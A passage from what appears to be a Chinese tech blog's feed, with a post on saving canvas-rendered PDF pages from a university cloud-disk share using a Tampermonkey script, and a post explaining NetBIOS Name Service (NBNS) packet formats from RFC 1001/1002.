        <content type="html"><![CDATA[<p>女友最近在网上下载一些北大网盘的pdf<a href="https://disk.pku.edu.cn/#/link/3A7748E0466521E3E68A0CBA4C24DE20?gns=AE26ACF837E24D51B1EC40E0A80A5D23%2F7F0E54D7D92343B1B62031B1C41F2280">文档</a>，结果发现没有下载接口，另存为也只能存储单张图片。找我帮忙，这时候发现程序员男票的好处了哈。</p><h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>一开始想着使用Chrome调试工具看下pdf链接，发现这个网盘居然不是直接获取的pdf文件，而是使用js脚本动态渲染生成的，涨知识了。</p><p><img src="/assets/canvas/pdf-js.png" alt="pdf-combine js"></p><p>那看看是否可以以图片形式批量下载呢，结果查看pdf单页的html结构发现，这居然是个canvas!!!还不是普通图片，而是画布。</p><p><img src="/assets/canvas/canvas.png" alt="cancvs"></p><h2 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h2><p>没关系，canvas什么的也不是难事，万能的油猴插件总会有解决方案的，果不其然让我找到个专门用于下载svg, canvas的油猴插件↓</p><ul><li><a href="https://greasyfork.org/zh-CN/scripts/383101-%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87-%E8%83%8C%E6%99%AF%E5%9B%BE-svg-canvas-%E6%8A%93%E5%8F%96%E9%A2%84%E8%A7%88%E4%B8%8B%E8%BD%BD">网站图片（背景图，svg，canvas）抓取预览下载</a></li></ul><h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><p>这正是我想要的，安装好后，使用起来非常简单，刷新要下载canvas图片的页面，在右下角有一个按钮<strong>自动获取图片</strong>。</p><p><img src="/assets/canvas/check-tampermonkey.png" alt="js extension"></p><p>点击之后开始扫描，注意下图中的数字并不代表实际的图片数量，不用理会。</p><p><img src="/assets/canvas/scanning.png" alt="scanning"></p><p>扫描完成后，可以限定图片大小，以滤除不符合要求的小图片，然后通过<strong>批量下载</strong>完成下载，对于数量较多的页面可能需要稍微等一小会，绝大部分情况是很快的。</p><p><img src="/assets/canvas/download.png" alt="download"></p><p>这样就下载完成啦。</p><p><img src="/assets/canvas/downloaded.png" alt="downloaded"></p><p>至于如何将批量转换为pdf，那方法就多啦，福昕pdf编辑器、ABBYY等等，这个留待下回再讲，哈哈。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>经评论区大佬@Axun提醒，本文所爬网站的PDF文件是可以直接提取的，刷新页面过滤<code>Access</code>即可得到下面的链接，右键在新页面打开即可保存，然后添加扩展名即可。</p><p><img src="/assets/canvas/pdf-source-file.png" alt="PDF source file"></p><p>当然啦，本文提及的canvas图片下载方法也适用于其它网站，欢迎食用。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tampermonkey </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络协议详解1 - NBNS</title>
      <link href="2020/02/28/nbns/"/>
      <url>2020/02/28/nbns/</url>
      
        <content type="html"><![CDATA[<h2 id="NetBIOS-简介"><a href="#NetBIOS-简介" class="headerlink" title="NetBIOS 简介"></a>NetBIOS 简介</h2><p><strong>NetBIOS</strong>，Network Basic Input/Output System的缩写，一般指用于<strong>局域网</strong>通信的一套API，相关RFC文档包括 <a href="https://tools.ietf.org/html/rfc1001">RFC 1001</a>, <a href="https://tools.ietf.org/html/rfc1002">RFC 1002</a>. RFC 1001主要对NetBIOS及相关协议和服务进行解释说明，RFC 1002给出了相关协议和服务的数据组包格式。</p><p>NetBIOS提供三种软件服务：</p><table><thead><tr><th>Service Name</th><th>Port</th><th>Protocol</th><th>Short Name</th></tr></thead><tbody><tr><td>NetBIOS Name service</td><td>137</td><td>UDP/TCP</td><td>NBNS</td></tr><tr><td>NetBIOS Datagram</td><td>138</td><td>UDP</td><td>NBND</td></tr><tr><td>NetBIOS Session service</td><td>139</td><td>TCP</td><td>NBSS</td></tr></tbody></table><p>本文主要描述最常见的<code>NBNS</code>.</p><span id="more"></span><h2 id="NBNS-简介"><a href="#NBNS-简介" class="headerlink" title="NBNS 简介"></a>NBNS 简介</h2><p><strong>NBNS</strong>是NetBIOS name service的缩写，是NetBIOS的命名服务，用于将NetBIOS名称映射到IP地址上，是NetBIOS-over-TCP(NBT)协议族的一份子。NBNS是动态DNS的一种，Microsoft的NBNS实现称为<code>WINS</code>。路由器可以通过发送NBNS状态请求以获取设备名，windows PC 接收到后通过WINS或将本地缓存发送命名信息给路由器。</p><h2 id="NBNS-数据报格式"><a href="#NBNS-数据报格式" class="headerlink" title="NBNS 数据报格式"></a>NBNS 数据报格式</h2><p>NBNS的数据报文格式在RFC 1002 Ch4.2中定义，包含以下信息</p><pre><code class="md">&gt; 4.2.1 GENERAL FORMAT OF NAME SERVICE PACKETS&gt;   4.2.1.1 HEADER&gt;   4.2.1.2 QUESTION SECTION&gt;   4.2.1.3 RESOURCE RECORD&gt; 4.2.2 NAME REGISTRATION REQUEST  4.2.3 NAME OVERWRITE REQUEST &amp; DEMAND  4.2.4 NAME REFRESH REQUEST&gt; 4.2.5 POSITIVE NAME REGISTRATION RESPONSE  4.2.6 NEGATIVE NAME REGISTRATION RESPONSE  4.2.7 END-NODE CHALLENGE REGISTRATION RESPONSE  4.2.8 NAME CONFLICT DEMAND  4.2.9 NAME RELEASE REQUEST &amp; DEMAND  4.2.10 POSITIVE NAME RELEASE RESPONSE  4.2.11 NEGATIVE NAME RELEASE RESPONSE  4.2.12 NAME QUERY REQUEST  4.2.13 POSITIVE NAME QUERY RESPONSE  4.2.14 NEGATIVE NAME QUERY RESPONSE  4.2.15 REDIRECT NAME QUERY RESPONSE  4.2.16 WAIT FOR ACKNOWLEDGEMENT (WACK) RESPONSE&gt; 4.2.17 NODE STATUS REQUEST&gt; 4.2.18 NODE STATUS RESPONSE</code></pre><p>本文主要介绍列表中<code>&gt;</code>开头的部分。</p><h3 id="GENERL-HEADER"><a href="#GENERL-HEADER" class="headerlink" title="GENERL HEADER"></a>GENERL HEADER</h3><p>NetBIOS数据包的通用格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |+ ------                                                ------- +|                            HEADER                             |+ ------                                                ------- +|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                       QUESTION ENTRIES                        /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                   ANSWER RESOURCE RECORDS                     /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                  AUTHORITY RESOURCE RECORDS                   /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                  ADDITIONAL RESOURCE RECORDS                  /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><ul><li>HEADER: 头部信息，包含ID信息等</li><li>QUESTION ENTRIES: 请求信息</li><li>ANSWER RESOURCE RECORDS: 应答信息</li><li>AUTHORITY RESOURCE RECORDS: 授权信息</li><li>ADDITIONAL RESOURCE RECORDS: 额外添加信息，如注册信息、刷新信息</li></ul><h4 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a>HEADER</h4><p>下面先来看<code>HEADER</code>信息。</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           NAME_TRN_ID         | OPCODE  |   NM_FLAGS  | RCODE |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|             QDCOUNT           |            ANCOUNT            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|             NSCOUNT           |            ARCOUNT            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><ul><li>NAME_TRN_ID: Transaction ID, 可以称为交易ID，就是针对本次请求或应答对应的ID</li><li>OPCODE: 包的类型码，后面详述</li><li>NM_FLAGS: 本次操作相关的标志位，后面详述</li><li>RCODE: result code or request, 在应答信息中被填入，具体数值依情况而定</li><li>QDCOUNT: uint_16 请求信息条例数量</li><li>ANCOUNT: uint_16 应答信息记录数量</li><li>NSCOUNT: uint_16 授权资源记录数量</li><li>ARCOUNT: uint_16 额外资源记录数量</li></ul><p>关于<strong>OPCODE</strong>，如下表所示：</p><pre><code class="yml">  0   1   2   3   4+---+---+---+---+---+| R |    OPCODE     |+---+---+---+---+---+</code></pre><ul><li>R: 为0代表请求包，为1代表应答包</li><li>1-4bit的值标志不同的操作：<ul><li>0 = query</li><li>5 = registration</li><li>6 = release</li><li>7 = WACK</li><li>8 = refresh</li></ul></li></ul><p>关于<strong>NM_FLAGS</strong>, 如下表所示：</p><pre><code class="yml">  0   1   2   3   4   5   6+---+---+---+---+---+---+---+|AA |TC |RD |RA | 0 | 0 | B |+---+---+---+---+---+---+---+</code></pre><ul><li>AA - Authoritative Answer flag, 当OPCODE中的R为0时必须为0，在响应报文中总是被设为1</li><li>TC - 截断标志，当数据报长度超过576字节后，需要截断</li><li>RD - 仅用于请求包，应答包会复制该值；该值为1代表NBNS会迭代请求、注册和释放</li><li>RA - 为1代表可以递归请求、注册和释放，为0则必须迭代请求</li><li>B - 为1代表广播包或多播包，为0代表单播包</li></ul><p><code>RA</code>与<code>RD</code>的原文解释如下：</p><blockquote><p><strong><code>RA</code></strong> 3 Recursion Available Flag.<br>Only valid in responses from a NetBIOS Name Server -- must be zero in all other responses.<br>If one (1) then the NBNS supports recursive query, registration, and release.<br>If zero (0) then the end-node must iterate for query and challenge for registration.</p><p><strong><code>RD</code></strong> 6 Recursion Desired Flag.<br>May only be set on a request to a NetBIOS Name Server.<br>The NBNS will copy its state into the response packet.<br>If one (1) the NBNS will iterate on the query, registration, or release.</p></blockquote><p>大致意思是，对于请求、注册和释放，包含递归发送和迭代发送两种方式。<code>RA</code>为1说明支持递归，为0说明只能迭代，表征的是一种能力；<code>RD</code>则是说明具体以什么方式发送，如果为1则代表迭代，表征的是一个具体动作，这个值在响应包中会从请求包中复制得到。</p><h4 id="QUESTION-SECTION"><a href="#QUESTION-SECTION" class="headerlink" title="QUESTION SECTION"></a>QUESTION SECTION</h4><p>NBNS的请求数据段格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                          QUESTION_NAME                        //                                                               /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|         QUESTION_TYPE         |          QUESTION_CLASS       |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><ul><li>QUESTION_NAME: 被压缩的NetBIOS，编码格式如 <a href="#NetBIOS-%E5%91%BD%E5%90%8D%E7%BC%96%E7%A0%81">NetBIOS-命名编码</a></li><li>QUESTION_TYPE: 请求类型<ul><li>0x0020 NB: NetBIOS 通用名称服务资源记录</li><li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> 资源记录</li></ul></li><li>QUESTION_CLASS: 请求类别<ul><li>0x0001 Internet class</li></ul></li></ul><h4 id="RESOURCE-RECORD"><a href="#RESOURCE-RECORD" class="headerlink" title="RESOURCE RECORD"></a>RESOURCE RECORD</h4><p>NBNS的资源数据段可以存在于请求报文和应答报文中，数据格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                            RR_NAME                            //                                                               /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|            RR_TYPE            |            RR_CLASS           |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                              TTL                              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|            RDLENGTH           |                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               |/                                                               //                             RDATA                             /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><ul><li>RR_NAME: 与上述的<code>QUESTION_NAME</code>一致</li><li>RR_TYPE: 记录类型<ul><li>0x0001 A: IP地址记录</li><li>0x0002 NS: Name Server资源记录</li><li>0x000A NULL: 空记录</li><li>0x0020 NB: NetBIOS 通用名称服务资源记录</li><li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> 资源记录</li></ul></li><li>RR_CLASS: 记录类别<ul><li>0x0001 Internet class</li></ul></li><li>RDLENGTH: uint_16 指定RDATA数据段的数据长度</li><li>TTL: 某资源记录名称的生存时间</li><li>RDATA: 基于<code>RR_TYPE</code>和<code>RR_CLASS</code>的数据信息，包含具体的NetBIOS name.</li></ul><p>针对RR_TYPE为NB的情况，RDATA的<code>NB_FLAGS</code>部分的数据格式如下：</p><pre><code class="yml">                                          1   1   1   1   1   1  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+| G |  ONT  |                RESERVED                           |+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+</code></pre><ul><li>G: 为0代表unique NetBIOS name, 即唯一名称；为1代表group NetBIOS name, 即组名称。</li><li>ONT: Owner Node Type<ul><li>00 = B node, 广播节点(Broadcast)</li><li>01 = P node, 单播节点(Point to Point)</li><li>10 = M node, 混合节点(Mixed)</li><li>11 = Reserved</li></ul></li><li>RESERVED</li></ul><p>以上便是HEADER, QUESTION SECTION以及RESOURCE RECORD 3个部分的主要内容，所有NBNS相关的请求包和响应包都依循以上格式，具体的信息细节则依情况而定。</p><h3 id="NAME-REGISTRATION-REQUEST"><a href="#NAME-REGISTRATION-REQUEST" class="headerlink" title="NAME REGISTRATION REQUEST"></a>NAME REGISTRATION REQUEST</h3><p>名称注册请求格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|         NAME_TRN_ID           |0|  0x5  |0|0|1|0|0 0|B|  0x0  |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0001               |           0x0000              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0001              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                         QUESTION_NAME                         //                                                               /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           NB (0x0020)         |        IN (0x0001)            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                            RR_NAME                            //                                                               /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           NB (0x0020)         |        IN (0x0001)            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                              TTL                              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           0x0006              |        NB_FLAGS               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                          NB_ADDRESS                           |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>可以和上面介绍的进行一一核对，头部信息的<code>OPCODE</code>为<code>0|0x5</code>, R为0说明是请求包，0x5说明是registration，即注册信息请求；NM_FLAGS<code>AA|TC|RD|RA|0|0|B</code>为<code>0|0|1|0|0|0|B</code>, 因为是请求包，所以<code>AA=0</code>；默认支持注册信息请求包含query和additional两部分信息，所以<code>QDCOUNT</code>和<code>ARCOUND</code>均为1，其余两个计数值为0。</p><p>HEADER往后是QUESTION_NAME，NB (0x0020)说明名称请求类型为<code>NB</code>, 请求类别通常均为0x0001, 固定不变。</p><p>再往后是TTL，固定的0x0006表征NB_FLAGS和NB_ADDRESS的总长为6个字节。其中NB_ADDRESS就是要注册的地址，而NB_FLAGS标记了这个名称的唯一性和数据包的类型（广播还是单播）。</p><h3 id="POSTIVE-NAME-REGISTRATION-RESPONSE"><a href="#POSTIVE-NAME-REGISTRATION-RESPONSE" class="headerlink" title="POSTIVE NAME REGISTRATION RESPONSE"></a>POSTIVE NAME REGISTRATION RESPONSE</h3><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| NAME_TRN_ID |1| 0x5 |1|0|1|1|0 0|0| 0x0 |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0001              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0000              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                            RR_NAME                            //                                                               /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           NB (0x0020)         |        IN (0x0001)            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                              TTL                              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|           0x0006              |        NB_FLAGS               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                          NB_ADDRESS                           |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>在Registration response中，HEADER的<code>R</code>和<code>AA</code>都变成了1，代表响应包；<code>B</code>为0代表单播包形式发送；<code>RA</code>与<code>RD</code>均为1，说明终端支持递归请求、注册和释放，但是会以迭代的方式进行请求、注册或释放。后面部分与请求注册的信息一致。</p><h3 id="NODE-STATUS-REQUEST"><a href="#NODE-STATUS-REQUEST" class="headerlink" title="NODE STATUS REQUEST"></a>NODE STATUS REQUEST</h3><p>Node status request也是路由器获取PC设备名称的常用方式，其请求格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| NAME_TRN_ID |0| 0x0 |0|0|0|0|0 0|B| 0x0 |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0001               |           0x0000              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0000              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                         QUESTION_NAME                         /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|         NBSTAT (0x0021)       |        IN (0x0001)            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>与registration相比，RR_TYPE由NB变味了NBSTAT，少了Additional部分，仅仅包含请求信息。</p><h3 id="NODE-STATUS-RESPONSE"><a href="#NODE-STATUS-RESPONSE" class="headerlink" title="NODE STATUS RESPONSE"></a>NODE STATUS RESPONSE</h3><p>Node status response的数据包格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|         NAME_TRN_ID           |1|  0x0  |1|0|0|0|0 0|0|  0x0  |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0001              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|          0x0000               |           0x0000              |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |/                            RR_NAME                            /|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|         NBSTAT (0x0021)       |        IN (0x0001)            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                          0x00000000                           |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|            RDLENGTH           |   NUM_NAMES   |               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +|                                                               |+                                                               +/                         NODE_NAME ARRAY                       /+                                                               +|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |+                                                               +/                           STATISTICS                          /+                                                               +|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>节点状态信息很多，其中<code>NUM_NAMES</code>表示后面紧随的节点名称数组长度，每个数组元素包含18字节：16字节的名称和2个字节的NAME_FLAGS. NAME_FLAGS格式如下：</p><pre><code class="yml">                                          1   1   1   1   1   1  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+| G |  ONT  |DRG|CNF|ACT|PRM|          RESERVED                 |+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+</code></pre><ul><li>G: 组名标志，为1代表组名，为0代表唯一名称</li><li>ONT: Owner Node Type<ul><li>00 = B node</li><li>01 = P node</li><li>10 = M node</li><li>11 = Reserved</li></ul></li><li>DRG: 注销标志</li><li>CNF: 冲突标志</li><li>ACT: 有效名称标志，均设置为1</li><li>PRM: 永久名称标志</li><li>RESERVED</li></ul><p>STATISTICS字段的格式如下：</p><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|               UNIT_ID (Unique unit ID)                        |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|       UNIT_ID,continued       |    JUMPERS    |  TEST_RESULT  |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|       VERSION_NUMBER          |      PERIOD_OF_STATISTICS     |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|       NUMBER_OF_CRCs          |     NUMBER_ALIGNMENT_ERRORS   |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|       NUMBER_OF_COLLISIONS    |       NUMBER_SEND_ABORTS      |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                       NUMBER_GOOD_SENDS                       |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                      NUMBER_GOOD_RECEIVES                     |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|       NUMBER_RETRANSMITS      | NUMBER_NO_RESOURCE_CONDITIONS |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|  NUMBER_FREE_COMMAND_BLOCKS   |  TOTAL_NUMBER_COMMAND_BLOCKS  |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|MAX_TOTAL_NUMBER_COMMAND_BLOCKS|    NUMBER_PENDING_SESSIONS    |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|  MAX_NUMBER_PENDING_SESSIONS  |  MAX_TOTAL_SESSIONS_POSSIBLE  |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|   SESSION_DATA_PACKET_SIZE    |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><h2 id="NetBIOS-命名编码"><a href="#NetBIOS-命名编码" class="headerlink" title="NetBIOS 命名编码"></a>NetBIOS 命名编码</h2><p>上面所有提及的报文中都包含NetBIOS名称，这个名称是被经过编码处理的。参考以下<a href="https://tools.ietf.org/html/rfc1001">RFC 1001 Ch14.1</a>可知，最长16Byte的NetBIOS name被要求映射为32Byte的可逆的、半ASCII偏置编码。</p><blockquote><p>The 16 byte NetBIOS name is mapped into a 32 byte wide field using a reversible, half-ASCII, biased encoding.  Each half-octet of the NetBIOS name is encoded into one byte of the 32 byte field.  The first half octet is encoded into the first byte, the second half- octet into the second byte, etc.</p><p>Each 4-bit, half-octet of the NetBIOS name is treated as an 8-bit, right-adjusted, zero-filled binary number.  This number is added to value of the ASCII character &#39;A&#39; (hexidecimal 41).  The resulting 8- bit number is stored in the appropriate byte.</p></blockquote><p>简单讲，就是将每个字符按ASCII拆成两部分，每部分再加上<code>A</code>，从而由1个字符变成两个字符。比如字符<code>L</code>，对应ASCII <code>0x4C</code>，拆成两部分为<code>0x4</code>和<code>0xC</code>，然后每部分都加上字符<code>A</code>对应的ASCII <code>0x41</code>，得到<code>0x45</code>和<code>0x4D</code>，对应字符<code>E</code>和<code>M</code>，这样原始字符<code>L</code>就变成了双字符<code>EM</code>。下面是这个示例的详细说明图解。</p><p><img src="/assets/network/nbns/nbns_name.png" 